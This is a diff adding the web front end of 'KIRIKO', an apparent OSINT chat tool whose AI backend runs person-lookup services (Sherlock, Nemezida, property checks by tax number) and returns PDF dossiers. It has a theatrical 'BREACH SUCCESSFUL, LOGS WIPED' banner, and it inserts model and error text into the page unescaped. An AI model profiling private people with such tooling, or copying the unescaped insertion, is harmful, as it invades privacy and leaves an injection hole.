+      overflow-y: scroll; scrollbar-width: none;
+      padding: 8px 13px 6px;
+      display: flex; flex-direction: column; gap: 1px;
+    }
+    #ol-lines::-webkit-scrollbar { display: none; }
+
+    .ol-line {
+      font-size: 10.5px; line-height: 1.54; letter-spacing: 0.01em;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+      font-family: 'Courier New', monospace;
+      flex-shrink: 0;
+    }
+    .ol-ts  { color: rgba(60,100,200,0.32); }
+    .ol-ok  { color: rgba(40,215,255,0.88); }
+    .ol-err { color: rgba(255,52,52,0.86); }
+    .ol-inf { color: rgba(95,150,255,0.48); }
+    .ol-dim  { color: rgba(60,90,165,0.28); }
+    .ol-txt  { color: rgba(150,185,255,0.55); }
+    .ol-val  { color: rgba(228,244,255,0.96); font-weight: bold; }
+    /* Исполненные команды в истории — тусклые, как в реальном терминале */
+    .ol-exec { color: rgba(80,115,210,0.30); letter-spacing: 0; white-space: pre; }
+
+    /* Финальный "breach" баннер */
+    #ol-breach {
+      display: none; flex-shrink: 0;
+      padding: 10px 13px 12px;
+      border-top: 1px solid rgba(0,255,120,0.18);
+      font-family: 'Courier New', monospace;
+      font-size: 10.5px;
+    }
+    #ol-breach.show { display: block; }
+    .olb-sep  { color: rgba(0,220,100,0.35); letter-spacing: 0; user-select:none; }
+    .olb-head {
+      color: rgba(0,255,130,0.95); font-size: 11px; font-weight: bold;
+      letter-spacing: 0.22em; text-align: center; margin: 5px 0;
+      text-shadow: 0 0 10px rgba(0,255,100,0.70), 0 0 28px rgba(0,200,80,0.40);
+      animation: olbPulse 1.8s ease-in-out infinite;
+    }
+    @keyframes olbPulse { 0%,100%{opacity:1;} 50%{opacity:0.65;} }
+    .olb-row {
+      color: rgba(0,215,100,0.82); letter-spacing: 0.06em;
+      margin: 2px 0;
+    }
+    .olb-row span { color: rgba(0,255,140,0.96); font-weight: bold; }
+
+    /* Командная строка */
+    #osint-cmd-area {
+      flex-shrink: 0; padding: 5px 13px 9px;
+      border-top: 1px solid rgba(80,130,255,0.07);
+      display: flex; align-items: baseline; gap: 5px;
+      font-family: 'Courier New', monospace; font-size: 10.5px;
+    }
+    .ol-prompt   { color: rgba(75,125,255,0.45); flex-shrink: 0; }
+    #ol-cmd-text { color: rgba(200,225,255,0.82); }
+    .ol-caret {
+      color: rgba(80,155,255,0.85);
+      animation: olBlink .9s steps(1) infinite;
+    }
+    @keyframes olBlink { 0%,49%{opacity:1;} 50%,100%{opacity:0;} }
+
+  </style>
+</head>
+<body>
+
+<!-- Matrix rain canvas -->
+<canvas id="matrix"></canvas>
+
+<div id="app">
+
+  <!-- Header -->
+  <header>
+    <div class="logo">
+      <span class="logo-kanji">霧子</span>
+      <span class="logo-latin">KIRIKO</span>
+    </div>
+    <div class="header-actions">
+      <div class="lang-switch">
+        <span class="lang-btn" data-lang="ru">RU</span>
+        <span class="lang-sep">·</span>
+        <span class="lang-btn" data-lang="ua">UA</span>
+        <span class="lang-sep">·</span>
+        <span class="lang-btn" data-lang="en">EN</span>
+      </div>
+      <span class="btn-icon" id="history-btn" data-i18n="btn_history">[ история ]</span>
+      <span class="btn-icon" id="download-btn" data-i18n="btn_download">[ скачать ]</span>
+      <span class="btn-icon danger" id="clear-btn" data-i18n="btn_clear">[ очистить ]</span>
+      <span class="btn-icon danger" id="logout-btn" data-i18n="btn_logout">[ выйти ]</span>
+    </div>
+  </header>
+
+
+  <!-- Messages -->
+  <div id="messages">
+    <div id="welcome">
+      <div class="welcome-title">KIRIKO</div>
+      <div class="welcome-sub">
+        <span class="ws-1">КАЖДЫЙ</span>
+        <span class="ws-2">ОСТАВЛЯЕТ</span>
+        <span class="ws-3">СЛЕД.</span>
+      </div>
+    </div>
+    <div id="loading-row">
+      <!-- hidden: kept so old JS (drawRadar/hackPhrases) doesn't crash -->
+      <canvas id="loading-canvas" width="60" height="60" style="display:none"></canvas>
+      <span id="loading-text" style="display:none"></span>
+      <!-- hacker terminal window -->
+      <div id="hack-terminal">
+        <div id="hack-term-head">
+          <div class="hth-dots">
+            <span class="htd htd-r"></span>
+            <span class="htd htd-y"></span>
+            <span class="htd htd-b"></span>
+          </div>
+          <span class="hth-title">kiriko@osint:~  ──  session active</span>
+          <span id="hth-pid">PID: 0000</span>
+        </div>
+        <div id="hack-term-body">
+          <div id="hack-lines"></div>
+          <div id="hack-input-line">
+            <span class="hi-prompt">kiriko@osint:~$</span>
+            <span id="hi-cmd"></span><span class="hi-cur">▮</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Input -->
+  <div id="input-area">
+    <div id="attachments-bar" class="hidden"></div>
+    <div class="input-wrap">
+      <button id="attach-btn" title="Прикрепить файл">[+]</button>
+      <input type="file" id="file-input" multiple
+             accept="image/*,.pdf,.docx,.doc" style="display:none">
+      <span class="term-prompt">&gt;_</span>
+      <div id="inp-hl-wrap">
+        <div id="input-highlight" aria-hidden="true"></div>
+        <textarea id="user-input" rows="1" placeholder="введите запрос..." data-i18n-ph="input_ph"></textarea>
+      </div>
+      <button id="send-btn">▶</button>
+    </div>
+    <div class="input-meta">
+      <span id="bytes-out">BYTES: 0x0000</span>
+      <span id="char-out">0 CHR</span>
+    </div>
+    <div class="hint-text" data-i18n="hint">Enter — отправить &nbsp;·&nbsp; Shift+Enter — новая строка</div>
+  </div>
+
+</div>
+
+<!-- ── Right-side OSINT live log panel ── -->
+<div id="osint-log">
+  <div id="osint-log-head">
+    <div class="olh-dots">
+      <span class="old old-r"></span>
+      <span class="old old-y"></span>
+      <span class="old old-b"></span>
+    </div>
+    <div class="olh-info">
+      <span class="olh-status">kiriko@osint:~ &nbsp;── &nbsp;session active</span>
+    </div>
+    <span class="olh-pid" id="ol-pid">PID: ----</span>
+    <span id="ol-hide-btn">[ скрыть ]</span>
+  </div>
+  <div id="ol-lines"></div>
+  <div id="ol-breach">
+    <div class="olb-sep">────────────────────────────────</div>
+    <div class="olb-head">■ BREACH SUCCESSFUL ■</div>
+    <div class="olb-row">► <span>DATA EXTRACTED</span></div>
+    <div class="olb-row">► <span>ACCESS REVOKED</span>  ← clean exit</div>
+    <div class="olb-row">► <span>LOGS WIPED</span>      ← no trace</div>
+    <div class="olb-sep">────────────────────────────────</div>
+  </div>
+  <div id="osint-cmd-area">
+    <span class="ol-prompt">kiriko@osint:~$</span>
+    <span id="ol-cmd-text"></span><span class="ol-caret">▮</span>
+  </div>
+</div>
+
+<!-- ── History modal ── -->
+<div id="history-modal" class="modal-overlay hidden">
+  <div class="modal-box">
+    <div class="modal-head">
+      <span class="modal-title" data-i18n="modal_history">[ история бесед ]</span>
+      <span class="modal-close" id="history-close">×</span>
+    </div>
+    <div class="modal-body" id="history-list">
+      <div class="hist-empty">загрузка...</div>
+    </div>
+    <div style="padding:10px 18px 14px;border-top:1px solid rgba(168,200,255,0.07);text-align:right;">
+      <span class="btn-icon danger" id="clear-all-btn" data-i18n="btn_clear_all">[ очистить всё ]</span>
+    </div>
+  </div>
+</div>
+
+<!-- ── Download modal ── -->
+<div id="download-modal" class="modal-overlay hidden">
+  <div class="modal-box small">
+    <div class="modal-head">
+      <span class="modal-title" data-i18n="modal_export">[ экспорт ]</span>
+      <span class="modal-close" id="download-close">×</span>
+    </div>
+    <div id="dl-body"></div>
+  </div>
+</div>
+
+<script>
+/* ══════════════════════════════════════════════════════════
+   I18N — translations
+══════════════════════════════════════════════════════════ */
+const LANGS = {
+  ru: {
+    btn_history:    '[ история ]',
+    btn_download:   '[ скачать ]',
+    btn_clear:      '[ очистить ]',
+    btn_logout:     '[ выйти ]',
+    welcome_sub:    'Каждый оставляет след.',
+    ws1: 'КАЖДЫЙ', ws2: 'ОСТАВЛЯЕТ', ws3: 'СЛЕД.',
+    input_ph:       'введите запрос...',
+    hint:           'Enter — отправить · Shift+Enter — новая строка',
+    modal_history:  '[ история бесед ]',
+    modal_export:   '[ экспорт ]',
+    hist_loading:   'загрузка...',
+    hist_empty:     'история пуста',
+    hist_err:       'ошибка загрузки',
+    hist_msgs:      'сообщ.',
+    hist_delete:    'удалить',
+    dl_note:        'скачивается финальный отчёт',
+    dl_no_msgs:     'нет активной беседы для экспорта',
+    dl_pdf:         'печать → PDF',
+    confirm_clear:     'Очистить текущую беседу?',
+    confirm_clear_all: 'Удалить ВСЮ историю навсегда? Это нельзя отменить.',
+    confirm_delete:    'Удалить эту беседу безвозвратно?',
+    btn_clear_all:     '[ очистить всё ]',
+    label_you:      '▶ ВЫ',
+    err:            'ошибка',
+    err_conn:       'ошибка соединения',
+  },
+  ua: {
+    btn_history:    '[ історія ]',
+    btn_download:   '[ завантажити ]',
+    btn_clear:      '[ очистити ]',
+    btn_logout:     '[ вийти ]',
+    welcome_sub:    'Кожен залишає слід.',
+    ws1: 'КОЖЕН', ws2: 'ЗАЛИШАЄ', ws3: 'СЛІД.',
+    input_ph:       'введіть запит...',
+    hint:           'Enter — надіслати · Shift+Enter — новий рядок',
+    modal_history:  '[ історія розмов ]',
+    modal_export:   '[ експорт ]',
+    hist_loading:   'завантаження...',
+    hist_empty:     'історія порожня',
+    hist_err:       'помилка завантаження',
+    hist_msgs:      'повід.',
+    hist_delete:    'видалити',
+    dl_note:        'завантажується фінальний звіт',
+    dl_no_msgs:     'немає активної розмови для експорту',
+    dl_pdf:         'друк → PDF',
+    confirm_clear:     'Очистити поточну розмову?',
+    confirm_clear_all: 'Видалити ВСЮ історію назавжди? Це неможливо скасувати.',
+    confirm_delete:    'Видалити цю розмову безповоротно?',
+    btn_clear_all:     '[ очистити все ]',
+    label_you:      '▶ ВИ',
+    err:            'помилка',
+    err_conn:       'помилка з\'єднання',
+  },
+  en: {
+    btn_history:    '[ history ]',
+    btn_download:   '[ download ]',
+    btn_clear:      '[ clear ]',
+    btn_logout:     '[ logout ]',
+    welcome_sub:    'Everyone leaves a trace.',
+    ws1: 'EVERYONE', ws2: 'LEAVES', ws3: 'TRACE.',
+    input_ph:       'enter query...',
+    hint:           'Enter — send · Shift+Enter — new line',
+    modal_history:  '[ conversation history ]',
+    modal_export:   '[ export ]',
+    hist_loading:   'loading...',
+    hist_empty:     'history is empty',
+    hist_err:       'loading error',
+    hist_msgs:      'msg.',
+    hist_delete:    'delete',
+    dl_note:        'downloading final report',
+    dl_no_msgs:     'no active conversation to export',
+    dl_pdf:         'print → PDF',
+    confirm_clear:     'Clear current conversation?',
+    confirm_clear_all: 'Delete ALL history forever? This cannot be undone.',
+    confirm_delete:    'Delete this conversation permanently?',
+    btn_clear_all:     '[ clear all ]',
+    label_you:      '▶ YOU',
+    err:            'error',
+    err_conn:       'connection error',
+  },
+};
+
+let currentLang = localStorage.getItem('kiriko_lang') || 'ru';
+
+function t(key) {
+  return (LANGS[currentLang] && LANGS[currentLang][key]) || LANGS.ru[key] || key;
+}
+
+function applyLang() {
+  // Static elements with data-i18n
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    el.textContent = t(el.dataset.i18n);
+  });
+  // Placeholder
+  document.querySelectorAll('[data-i18n-ph]').forEach(el => {
+    el.placeholder = t(el.dataset.i18nPh);
+  });
+  // Active lang button
+  document.querySelectorAll('.lang-btn').forEach(btn => {
+    btn.classList.toggle('active', btn.dataset.lang === currentLang);
+  });
+  // Update welcome-sub spans
+  document.querySelectorAll('.ws-1').forEach(el => el.textContent = t('ws1'));
+  document.querySelectorAll('.ws-2').forEach(el => el.textContent = t('ws2'));
+  document.querySelectorAll('.ws-3').forEach(el => el.textContent = t('ws3'));
+}
+
+function setLang(lang) {
+  if (!LANGS[lang]) return;
+  currentLang = lang;
+  localStorage.setItem('kiriko_lang', lang);
+  applyLang();
+}
+
+// Wire up lang buttons
+document.querySelectorAll('.lang-btn').forEach(btn => {
+  btn.addEventListener('click', () => setLang(btn.dataset.lang));
+});
+
+// Apply on load
+applyLang();
+
+/* ══════════════════════════════════════════════════════════
+   MATRIX RAIN — full res, setInterval 80ms, hidden-tab pause
+══════════════════════════════════════════════════════════ */
+(function() {
+  const canvas = document.getElementById('matrix');
+  const ctx    = canvas.getContext('2d', { alpha: false });
+
+  const chars = '01001101010000110110100001000001010000110100101101001001010100100100111' +
+                '0123456789ABCDEF!@#$%^&*()_+-=[]{}|;:,.<>?/\\~`' +
+                'rootvoidnulltruesudoexecbashsshkeyRSAforkbomb0xDEADBEEFsyscall';
+  const fontSize = 13;
+
+  let W, H, cols, drops, speeds, brightCol;
+
+  function init() {
+    W = canvas.width  = window.innerWidth;
+    H = canvas.height = window.innerHeight;
+    cols      = Math.floor(W / fontSize);
+    drops     = Array(cols).fill(0).map(() => Math.random() * -50);
+    speeds    = Array(cols).fill(0).map(() => 0.3 + Math.random() * 1.0);
+    brightCol = Array(cols).fill(0).map(() => Math.random() > 0.85);
+    ctx.fillStyle = '#000';
+    ctx.fillRect(0, 0, W, H);
+  }
+  init();
+
+  let resizeTimer;
+  window.addEventListener('resize', () => {
+    clearTimeout(resizeTimer);
+    resizeTimer = setTimeout(init, 300);
+  });
+
+  setInterval(() => {
+    if (document.hidden) return;
+
+    ctx.fillStyle = 'rgba(0,0,0,0.065)';
+    ctx.fillRect(0, 0, W, H);
+
+    for (let i = 0; i < cols; i++) {
+      const ch = chars[Math.floor(Math.random() * chars.length)];
+      const y  = drops[i] * fontSize;
+
+      if (Math.random() > 0.93) {
+        ctx.fillStyle = 'rgba(255,255,255,0.95)';
+        ctx.font = 'bold ' + fontSize + 'px monospace';
+      } else if (brightCol[i]) {
+        ctx.fillStyle = Math.random() > 0.94
+          ? 'rgba(255,45,45,0.88)' : 'rgba(120,190,255,0.88)';
+        ctx.font = fontSize + 'px monospace';
+      } else {
+        const a = 0.10 + Math.random() * 0.35;
+        ctx.fillStyle = Math.random() > 0.97
+          ? `rgba(255,35,35,${a})` : `rgba(72,148,255,${a})`;
+        ctx.font = fontSize + 'px monospace';
+      }
+
+      ctx.fillText(ch, i * fontSize, y);
+
+      if (y > H && Math.random() > 0.97) {
+        drops[i]     = 0;
+        speeds[i]    = 0.3 + Math.random() * 1.0;
+        brightCol[i] = Math.random() > 0.85;
+      }
+      drops[i] += speeds[i];
+    }
+  }, 80);
+})();
+
+/* ══════════════════════════════════════════════════════════
+   LOADING CANVAS — retired (replaced by #hack-terminal)
+   Canvas kept in DOM for compatibility; no rAF loop runs.
+══════════════════════════════════════════════════════════ */
+
+/* ══════════════════════════════════════════════════════════
+   MARKED
+══════════════════════════════════════════════════════════ */
+marked.setOptions({ breaks: true, gfm: true });
+
+/* ══════════════════════════════════════════════════════════
+   TOOL LABELS — human-readable step names
+══════════════════════════════════════════════════════════ */
+const TOOL_LABELS = {
+  nemezida_search:     'Nemezida',
+  sherlock_search:     'Sherlock',
+  opendata_realty:     'Перевірка нерухомості',
+  fanstatistik_search: 'FanStatistik',
+  thundertrace_search: 'ThunderTrace',
+};
+
+function toolLabel(name, input) {
+  const base = TOOL_LABELS[name] || name;
+  if (!input) return base;
+  const q = input.query || input.ipn || input.username || '';
+  return q ? `${base} — ${q}` : base;
+}
+
+/* ══════════════════════════════════════════════════════════
+   STATE
+══════════════════════════════════════════════════════════ */
+let messages   = [];
+let busy       = false;
+let sessionId  = crypto.randomUUID(); // new session per load / clear
+
+/* ══════════════════════════════════════════════════════════
+   DOM REFS
+══════════════════════════════════════════════════════════ */
+const msgContainer = document.getElementById('messages');
+const loadingRow   = document.getElementById('loading-row');
+const userInput    = document.getElementById('user-input');
+const sendBtn      = document.getElementById('send-btn');
+const clearBtn     = document.getElementById('clear-btn');
+const welcomeDiv   = document.getElementById('welcome');
+
+/* ══════════════════════════════════════════════════════════
+   HELPERS
+══════════════════════════════════════════════════════════ */
+let _scrollRAF = 0;
+function scrollBottom() {
+  cancelAnimationFrame(_scrollRAF);
+  _scrollRAF = requestAnimationFrame(() => {
+    msgContainer.scrollTop = msgContainer.scrollHeight;
+  });
+}
+
+function setLoading(on) {
+  loadingRow.classList.toggle('visible', on);
+  const ol = document.getElementById('osint-log');
+  if (!ol) { if (on) scrollBottom(); return; }
+
+  if (on) {
+    ol.classList.add('active');
+    if (window._osintLog) window._osintLog.open();
+    scrollBottom();
+  } else {
+    /* Показываем breach-баннер, панель остаётся открытой до нажатия [ скрыть ] */
+    if (window._osintLog) window._osintLog.success();
+  }
+}
+
+function hideWelcome() {
+  const w = document.getElementById('welcome');
+  if (w) w.remove();
+}
+
+function addUserBubble(text, attachments) {
+  hideWelcome();
+  const row = document.createElement('div');
+  row.className = 'msg-row user';
+  const b = document.createElement('div');
+  b.className = 'bubble user';
+
+  // Show attachment chips in bubble
+  if (attachments && attachments.length) {
+    const chipWrap = document.createElement('div');
+    chipWrap.style.cssText = 'display:flex;flex-wrap:wrap;gap:5px;margin-bottom:6px;';
+    attachments.forEach(att => {
+      const chip = document.createElement('span');
+      chip.style.cssText = 'font-size:10px;opacity:.70;background:rgba(168,200,255,.08);padding:2px 7px;border-radius:8px;border:1px solid rgba(168,200,255,.14);';
+      chip.textContent = att.icon + ' ' + att.name;
+      chipWrap.appendChild(chip);
+      // Show image preview if available
+      if (att.preview) {
+        const img = document.createElement('img');
+        img.src = att.preview;
+        img.className = 'attach-img';
+        b.appendChild(img);
+      }
+    });
+    b.appendChild(chipWrap);
+  }
+
+  if (text) {
+    const t = document.createElement('div');
+    t.textContent = text;
+    b.appendChild(t);
+  }
+
+  row.appendChild(b);
+  msgContainer.insertBefore(row, loadingRow);
+  scrollBottom();
+}
+
+function createAssistantBubble() {
+  const row = document.createElement('div');
+  row.className = 'msg-row asst';
+  const b = document.createElement('div');
+  b.className = 'bubble asst';
+  row.appendChild(b);
+  msgContainer.insertBefore(row, loadingRow);
+  scrollBottom();
+  return { row, bubble: b, text: '' };
+}
+
+function appendToBubble(state, chunk) {
+  state.text += chunk;
+  state.bubble.textContent = state.text;
+  scrollBottom();
+}
+
+function linkifyReport(text, extraPdfs) {
+  const pdfs = [];  // { label, url }
+  // Додаємо PDF зібрані під час стрімінгу
+  if (extraPdfs) extraPdfs.forEach(u => pdfs.push({ label: 'Nemezida', url: u }));
+
+  // Собираем PDF Nemezida — ловим любой формат с /static/reports/*.pdf
+  // Формат 1: "Файл Nemezida — Кандидат: /static/reports/xxx.pdf"
+  text = text.replace(/Файл Nemezida\s*[—-]\s*([^:\n]+):\s*(\/static\/reports\/[^\s\n]+\.pdf)/g,
+    (_, who, url) => { pdfs.push({ label: who.trim(), url }); return ''; }
+  );
+  // Формат 2: "PDF-файл: /static/reports/xxx.pdf" или просто URL пути
+  text = text.replace(/(?:PDF-файл|Файл PDF|Немезида PDF)[:\s]+?(\/static\/reports\/[^\s\n]+\.pdf)/g,
+    (_, url) => { pdfs.push({ label: 'Кандидат', url }); return ''; }
+  );
+  // Формат 3: любой /static/reports/*.pdf в тексте (запасной)
+  text = text.replace(/(\/static\/reports\/[^\s\n<>"']+\.pdf)/g,
+    (_, url) => { if (!pdfs.find(p => p.url === url)) pdfs.push({ label: 'Nemezida', url }); return ''; }
+  );
+
+  // Убираем строки с Шерлок-отчётом (они не работают)
+  text = text.replace(/Повний звіт:\s*https?:\/\/[^\s\n<>"']+/g, '');
+  text = text.replace(/https?:\/\/sherlock-report\.at[^\s\n<>"']*/g, '');
+
+  // Остальные URL — кликабельные ссылки
+  text = text.replace(/(https?:\/\/[^\s<>"']+)/g,
+    url => `<a href="${url}" target="_blank" rel="noopener" class="report-link">${url}</a>`
+  );
+
+  // Убираем лишние пустые строки
+  text = text.replace(/\n{3,}/g, '\n\n');
+
+  // Блок PDF кнопок в конце
+  if (pdfs.length) {
+    let block = '\n\n────────────────────────────────\n';
+    pdfs.forEach(p => {
+      block += `\n<a href="${p.url}" target="_blank" rel="noopener" class="pdf-dl-btn">⬇ PDF Nemezida — ${p.label}</a>`;
+    });
+    block += '\n────────────────────────────────';
+    text += block;
+  }
+
+  return text;
+}
+
+function finalizeBubble(state, extraPdfs) {
+  if (!state.text.trim()) return;
+  const linked = linkifyReport(state.text, extraPdfs || []);
+  state.bubble.innerHTML = linked !== state.text
+    ? `<pre style="white-space:pre-wrap;font-family:inherit;margin:0">${linked}</pre>`
+    : marked.parse(state.text);
+  state.bubble.classList.add('rendered');
+  scrollBottom();
+}
+
+function addToolIndicator(name, input) {
+  const label = toolLabel(name, input);
+  const wrap = document.createElement('div');
+  wrap.className = 'tool-row'; wrap.dataset.tool = name;
+  const ind = document.createElement('div');
+  ind.className = 'tool-indicator running';
+  ind.innerHTML = `<span>⟨</span><span class="tool-name">${escapeHtml(label)}</span><span class="dots"></span><span>⟩</span>`;
+  wrap.appendChild(ind);
+  msgContainer.insertBefore(wrap, loadingRow);
+  scrollBottom();
+}
+
+function addPhaseIndicator(label) {
+  const wrap = document.createElement('div');
+  wrap.className = 'tool-row'; wrap.dataset.tool = '__phase__';
+  const ind = document.createElement('div');
+  ind.className = 'tool-indicator running';
+  ind.innerHTML = `<span>⟨</span><span class="tool-name">${escapeHtml(label)}</span><span class="dots"></span><span>⟩</span>`;
+  wrap.appendChild(ind);
+  msgContainer.insertBefore(wrap, loadingRow);
+  scrollBottom();
+}
+
+function markPhaseIndicatorDone() {
+  const rows = msgContainer.querySelectorAll('.tool-row[data-tool="__phase__"]');
+  rows.forEach(row => {
+    const ind = row.querySelector('.tool-indicator.running');
+    if (!ind) return;
+    const label = ind.querySelector('.tool-name')?.textContent || '';
+    ind.classList.remove('running'); ind.classList.add('done');
+    ind.innerHTML = `<span style="color:rgba(168,200,255,0.55)">✓</span><span class="tool-name">${escapeHtml(label)}</span>`;
+  });
+}
+
+function addToolIndicatorDone(name) {
+  const label = TOOL_LABELS[name] || name;
+  const wrap = document.createElement('div');
+  wrap.className = 'tool-row';
+  const ind = document.createElement('div');
+  ind.className = 'tool-indicator done';
+  ind.innerHTML = `<span style="color:rgba(168,200,255,0.55)">✓</span><span class="tool-name">${escapeHtml(label)}</span>`;
+  wrap.appendChild(ind);
+  msgContainer.insertBefore(wrap, loadingRow);
+}
+
+function markToolDone(name) {
+  const rows = msgContainer.querySelectorAll(`.tool-row[data-tool="${name}"]`);
+  if (!rows.length) return;
+  // Find the last running indicator for this tool
+  for (let i = rows.length - 1; i >= 0; i--) {
+    const ind = rows[i].querySelector('.tool-indicator.running');
+    if (!ind) continue;
+    const label = ind.querySelector('.tool-name')?.textContent || TOOL_LABELS[name] || name;
+    ind.classList.remove('running'); ind.classList.add('done');
+    ind.innerHTML = `<span style="color:rgba(168,200,255,0.55)">✓</span><span class="tool-name">${escapeHtml(label)}</span>`;
+    break;
+  }
+}
+
+function setBusy(on) {
+  busy = on;
+  sendBtn.disabled  = on;
+  userInput.disabled = on;
+}
+
+/* ══════════════════════════════════════════════════════════
+   RENDER CONVERSATION (for history load)
+══════════════════════════════════════════════════════════ */
+function renderConversation(msgs) {
+  msgContainer.innerHTML = '';
+  msgContainer.appendChild(loadingRow);
+  messages = msgs;
+
+  for (const m of msgs) {
+    if (m.role === 'user') {
+      if (typeof m.content === 'string') addUserBubble(m.content);
+    } else if (m.role === 'assistant') {
+      const blocks = Array.isArray(m.content) ? m.content : [];
+      for (const tb of blocks.filter(b => b.type === 'tool_use'))
+        addToolIndicatorDone(tb.name);
+      const txt = blocks.filter(b => b.type === 'text').map(b => b.text).join('');
+      if (txt.trim()) {
+        const row = document.createElement('div');
+        row.className = 'msg-row asst';
+        const b = document.createElement('div');
+        b.className = 'bubble asst rendered';
+        b.innerHTML = marked.parse(txt);
+        row.appendChild(b);
+        msgContainer.insertBefore(row, loadingRow);
+      }
+    }
+  }
+  scrollBottom();
+}
+
+/* ══════════════════════════════════════════════════════════
+   FILE ATTACHMENTS
+══════════════════════════════════════════════════════════ */
+const attachBtn  = document.getElementById('attach-btn');
+const fileInput  = document.getElementById('file-input');
+const attachBar  = document.getElementById('attachments-bar');
+
+// pendingAttachments: array of { name, icon, blocks: [...Claude content blocks] }
+let pendingAttachments = [];
+
+function fileIcon(name) {
+  const ext = name.split('.').pop().toLowerCase();
+  if (['jpg','jpeg','png','gif','webp'].includes(ext)) return '🖼';
+  if (ext === 'pdf')  return '📄';
+  if (['docx','doc'].includes(ext)) return '📝';
+  return '📎';
+}
+
+function renderAttachBar() {
+  if (!pendingAttachments.length) {
+    attachBar.classList.add('hidden');
+    attachBar.innerHTML = '';
+    return;
+  }
+  attachBar.classList.remove('hidden');
+  attachBar.innerHTML = '';
+  pendingAttachments.forEach((att, idx) => {
+    const chip = document.createElement('div');
+    chip.className = 'attach-chip' + (att.loading ? ' loading' : '');
+    chip.innerHTML = `
+      <span class="chip-icon">${att.icon}</span>
+      <span class="chip-name">${escapeHtml(att.name)}</span>
+      <span class="chip-rm" data-idx="${idx}">×</span>`;
+    chip.querySelector('.chip-rm').addEventListener('click', () => {
+      pendingAttachments.splice(idx, 1);
+      renderAttachBar();
+    });
+    attachBar.appendChild(chip);
+  });
+}
+
+async function processFile(file) {
+  const icon = fileIcon(file.name);
+  const att  = { name: file.name, icon, blocks: [], loading: true };
+  pendingAttachments.push(att);
+  renderAttachBar();
+
+  const ext = file.name.split('.').pop().toLowerCase();
+
+  try {
+    if (['jpg','jpeg','png','gif','webp'].includes(ext)) {
+      // Client-side: read as base64
+      const b64 = await new Promise((res, rej) => {
+        const r = new FileReader();
+        r.onload  = () => res(r.result.split(',')[1]);
+        r.onerror = rej;
+        r.readAsDataURL(file);
+      });
+      const mime = file.type || 'image/jpeg';
+      att.blocks = [{
+        type: 'image',
+        source: { type: 'base64', media_type: mime, data: b64 }
+      }];
+      att.preview = URL.createObjectURL(file); // for bubble preview
+
+    } else {
+      // Server-side: PDF / DOCX
+      const fd = new FormData();
+      fd.append('file', file);
+      const resp = await fetch('/api/upload', { method: 'POST', body: fd });
+      const json = await resp.json();
+      if (json.error) throw new Error(json.error);
+      att.blocks = json.blocks;
+    }
+  } catch (err) {
+    att.name  = att.name + ' ⚠ ' + err.message;
+    att.blocks = [{ type: 'text', text: `[Помилка завантаження файлу: ${file.name}]` }];
+  }
+
+  att.loading = false;
+  renderAttachBar();
+}
+
+attachBtn.addEventListener('click', () => fileInput.click());
+fileInput.addEventListener('change', async () => {
+  const files = Array.from(fileInput.files);
+  fileInput.value = ''; // reset so same file can be re-added
+  for (const f of files) await processFile(f);
+});
+
+/* ══════════════════════════════════════════════════════════
+   SEND MESSAGE
+══════════════════════════════════════════════════════════ */
+async function sendMessage() {
+  const text = userInput.value.trim();
+  if ((!text && !pendingAttachments.length) || busy) return;
+
+  // Wait for any still-loading attachments
+  if (pendingAttachments.some(a => a.loading)) return;
+
+  userInput.value = '';
+  autoResize();
+
+  // Build content: attachment blocks + text block
+  const attachSnapshot = [...pendingAttachments];
+  pendingAttachments = [];
+  renderAttachBar();
+
+  let userContent;
+  if (attachSnapshot.length) {
+    // Multimodal content array
+    const blocks = [];
+    attachSnapshot.forEach(att => blocks.push(...att.blocks));
+    if (text) blocks.push({ type: 'text', text });
+    userContent = blocks;
+
+    // Show bubble with text + image previews
+    addUserBubble(text, attachSnapshot);
+  } else {
+    userContent = text;
+    addUserBubble(text);
+  }
+
+  messages.push({ role: 'user', content: userContent });
+  setBusy(true); setLoading(true);
+
+  // Detect "Проверка" trigger → show "Вивчення анкети" immediately
+  const msgText = typeof userContent === 'string' ? userContent
+    : (userContent.find?.(b => b.type === 'text')?.text || '');
+  const isCheckMode = /^проверка/i.test(msgText.trim()) ||
+    (attachSnapshot.length > 0 && /^проверка/i.test(msgText.trim()));
+  let studyDone = false;
+
+  if (isCheckMode) {
+    setLoading(false);
+    addPhaseIndicator('Вивчення анкети');
+    setLoading(true);
+  }
+
+  let asstState = null;
+  let streamedPdfs = [];  // PDF URLs зібрані під час стрімінгу
+  const PDF_RE = /\/static\/reports\/[^\s\n\]<>"']+\.pdf/g;
+
+  try {
+    const resp = await fetch('/api/chat', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ messages, session_id: sessionId }),
+    });
+    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+
+    const reader  = resp.body.getReader();
+    const decoder = new TextDecoder();
+    let buf = '';
+
+    while (true) {
+      const { done, value } = await reader.read();
+      if (done) break;
+      buf += decoder.decode(value, { stream: true });
+      const lines = buf.split('\n');
+      buf = lines.pop();
+
+      for (const line of lines) {
+        if (!line.startsWith('data: ')) continue;
+        let evt;
+        try { evt = JSON.parse(line.slice(6)); } catch { continue; }
+
+        if (evt.type === 'text') {
+          setLoading(false);
+          if (!asstState) asstState = createAssistantBubble();
+          appendToBubble(asstState, evt.text);
+          // Відстежуємо PDF URL під час стрімінгу
+          const matches = evt.text.match(PDF_RE);
+          if (matches) matches.forEach(u => { if (!streamedPdfs.includes(u)) streamedPdfs.push(u); });
+        } else if (evt.type === 'tool_start') {
+          setLoading(false);
+          // Mark "Вивчення анкети" done on first tool call
+          if (isCheckMode && !studyDone) {
+            markPhaseIndicatorDone();
+            studyDone = true;
+          }
+          addToolIndicator(evt.name, evt.input);
+          setLoading(true);
+        } else if (evt.type === 'tool_done') {
+          setLoading(false); markToolDone(evt.name); setLoading(true);
+        } else if (evt.type === 'done') {
+          setLoading(false);
+          // Also close study phase if no tools were called
+          if (isCheckMode && !studyDone) { markPhaseIndicatorDone(); studyDone = true; }
+          if (asstState) finalizeBubble(asstState, streamedPdfs);
+          if (evt.messages) messages = evt.messages;
+        } else if (evt.type === 'error') {
+          setLoading(false);
+          if (isCheckMode && !studyDone) { markPhaseIndicatorDone(); studyDone = true; }
+          const errRow = document.createElement('div');
+          errRow.className = 'msg-row asst';
+          errRow.innerHTML = `<div class="bubble asst" style="color:rgba(255,100,100,0.8)">[${t('err')}] ${evt.text}</div>`;
+          msgContainer.insertBefore(errRow, loadingRow);
+          scrollBottom();
+        }
+      }
+    }
